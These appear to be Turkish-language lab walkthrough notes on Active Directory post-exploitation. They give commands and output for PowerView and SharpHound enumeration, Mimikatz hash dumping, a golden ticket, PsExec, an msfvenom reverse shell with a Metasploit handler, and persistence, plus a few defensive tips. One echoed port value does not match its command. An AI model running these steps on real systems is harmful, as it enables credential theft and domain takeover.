->ssh Administrator@machine_ip 

->powershell -ep bypass
PowerShell'in varsayılan olarak engellediği bazı özellikleri etkinleştirmek için kullanılır
-bypass parametresi, güvenlik uyarılarını atlamak ve kısıtlamaları devre dışı bırakmak için kullanılır. 
-ep parametresi, "Execution Policy" (Çalıştırma Politikası) ayarını etkisizleştirir, bu da
PowerShell betiği ve komut dosyalarının çalıştırılmasına izin verir. 

->. .\Downloads\PowerView.ps1
PowerView, Windows Active Directory ortamında yetkilendirme, kimlik doğrulama ve etki alanı yönetimi
ile ilgili birçok işlevi gerçekleştirmek için kullanılan bir PowerShell tabanlı bir araçtır.

->Get-NetUser | select cn 

Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd


->Get-NetGroup -GroupName *admin*
Administrators 
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins 
DnsAdmins

What is the shared folder that is not set by default?

->Invoke-ShareFinder

-Share

What operating system is running inside of the network besides Windows Server 2019?

->Get-NetComputer -fulldata | select operatingsystem

-Windows 10 Enterprise Evaluation


BloodHound, Windows Active Directory ortamında hakimiyet keşfi ve
güvenlik testleri için kullanılan bir araçtır. BloodHound, yetki
yükseltme senaryolarını belirlemek ve güvenlik zafiyetlerini tespit
etmek için kullanılan bir grafik analiz aracıdır.

->. .\Downloads\SharpHound.ps1

->Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

kali linux
->scp .\20210628073430_loot.zip root@ip:

loot.zip klasörünü Bloodhound'a sürükleyip bırakın



Mimikatz, Windows işletim sistemi üzerindeki parolaları ve diğer hassas bilgileri çalmak için
kullanılan bir araçtır. Mimikatz, birkaç farklı yöntem kullanarak bu bilgileri ele geçirir ve
ayrıca Windows Active Directory ortamında kullanılan Kerberos kimlik doğrulama protokolünü
çözmek için de kullanılabilir.

-> ./mimikatz.exe

Windows işletim sistemi üzerinde çalışan bir uygulamanın, yükseltilmiş bir ayrıcalık
seviyesine sahip olarak çalışmasını sağlamak için kullanılan bir komuttur

mimikatz # privilege::debug


Windows işletim sistemi üzerinde çalışan bir uygulamanın Local Security Authority (LSA)
alt sistemine ait bellek verilerinin dump edilmesi ve bu verilerde belirli değişiklikler
yapılması için kullanılan bir komuttur.

mimikatz # lsadump::lsa /patch
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6



kali linux 

->nano hash13.txt

->cat hash13.txt

2777b7fec870e04dda00cd7260f7bee6

->john --format=nt hash13.txt --wordlist=/usr/share/wordlists/rockyou.txt
-P@$$W0rd

Golden Ticket Attacks w/mimikatz
Golden Ticket, bir Windows Active Directory ortamında kimlik doğrulama için kullanılan
Kerberos protokolünde kullanılan uzun vadeli bir kimlik doğrulama tokenidir. Mimikatz
ise, Windows işletim sistemleri üzerinde çalışan uygulamaların bellek içeriğine erişmek
için kullanılan bir araçtır. Mimikatz, Kerberos bileşenlerine de erişebildiği için, Golden
Ticket saldırıları için yaygın olarak kullanılmaktadır.

Golden Ticket saldırısı, bir saldırganın Active Directory ortamında yüksek ayrıcalıklara
sahip bir hesap için bir Kerberos uzun vadeli kimlik doğrulama tokeni oluşturarak kimlik
doğrulama yapmasına olanak tanır. Bu saldırı, saldırganın Active Directory ortamında tam
kontrol sahibi olmasına olanak tanır ve kurban hesaplarının kimlik doğrulama bilgilerinin
çalınması durumunda da kullanılabilir.

Mimikatz aracı, Golden Ticket saldırısı için kullanılabilecek bir dizi fonksiyona sahiptir.
Bu fonksiyonlar arasında "kerberos::golden" komutu, Golden Ticket oluşturmak için kullanılan
bir komuttur. Bu komut, saldırganın uzun vadeli bir kimlik doğrulama tokeni oluşturmasına olanak
tanır ve bu tokeni kullanarak kimlik doğrulama yapabilir.

Golden Ticket saldırıları, Active Directory ortamlarında büyük bir güvenlik riski oluşturur ve
savunmasız sistemleri hedef alabilir. Bu nedenle, Golden Ticket saldırılarına karşı koruma
yöntemleri ve saldırıların tespiti için güvenlik önlemleri alınması önemlidir

Golden Ticket saldırılarına karşı alınabilecek bazı önlemler şunlardır:

Parola yönetimi: Güçlü ve karmaşık parolalar kullanmak, parolaları düzenli olarak
değiştirmek ve parolaları korumak için güvenli yöntemler kullanmak (örneğin, parolaları
şifreleyen bir parola yöneticisi kullanmak).

Active Directory Güvenliği: Active Directory ortamının güvenliği için gerekli adımların atılması,
izinleri doğru şekilde ayarlamak, kullanıcılara yalnızca gerektiği kadar ayrıcalık vermek ve gereksiz
ayrıcalıkları kaldırmak gibi.

İzleme ve güncelleme: Active Directory ortamının izlenmesi ve güncellenmesi,
sistemlerdeki güvenlik açıklarının tespit edilmesi ve bunların düzeltilmesi önemlidir.

Kerberos politikaları: Kerberos politikalarının doğru şekilde ayarlanması, Golden Ticket
saldırılarına karşı koruma sağlar. Örneğin, Kerberos politikaları ayarlanarak Kerberos
bileşenlerine erişimi sınırlandırmak mümkündür.

İki faktörlü kimlik doğrulama: İki faktörlü kimlik doğrulama kullanarak, Golden Ticket saldırılarına
karşı koruma sağlayabilirsiniz. İki faktörlü kimlik doğrulama, birincil kimlik doğrulama yöntemi
olarak Kerberos kullanırken, ikincil olarak bir PIN veya doğrulama kodu gerektirir.

-> ./mimikatz.exe
 
mimikatz # privilege::debug

mimikatz # lsadump::lsa /inject /name:krbtgt

Bu Mimikatz komutu, LSA alt sistemi üzerinden "krbtgt" hesabının Kerberos anahtarını alır ve
daha sonra bu anahtarı enjekte eder.
"/inject" parametresi, Kerberos anahtarını enjekte etmek için LSA alt sistemine yazma izni verir.
"/name:krbtgt" parametresi, "krbtgt" hesabının Kerberos anahtarını hedefler.


Golden Ticket Oluşturma 

mimikatz # kerberos::golden /user:Administrator /domain:controller.local 
/sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a
9a89ebdfdf /id:500 
User      : Administrator 
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 4/3/2023 4:34:52 PM ; 3/31/2033 4:34:52 PM ; 3/31/2033 4:34:52
 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !


misc::cmd 
Bu, tüm makinelerde yükseltilmiş ayrıcalıklara sahip yeni bir komut istemi açacaktır


PsExec.exe, Windows işletim sistemi üzerinde çalışan ve ağdaki uzaktaki
bilgisayarlarda işlemleri yürütmek için kullanılan bir komut satırı aracıdır.
->PsExec.exe \\Desktop-1  cmd.exe

C:\Windows\system32>hostname
Desktop-1




Metasploit ile erişimi sürdürmek

->msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f exe -o shell.exe

->scp shell.exe Administrator@machine_ip:

->msfconsole -q

msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 5555
msf6 exploit(multi/handler) > set LHOST ip
LHOST => 10.11.35.147
msf6 exploit(multi/handler) > run

meterpreter > background
[*] Backgrounding session 1...


msf6 exploit(multi/handler) > use exploit/windows/local/persistence
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence) > set session 1
session => 1
msf6 exploit(windows/local/persistence) > run
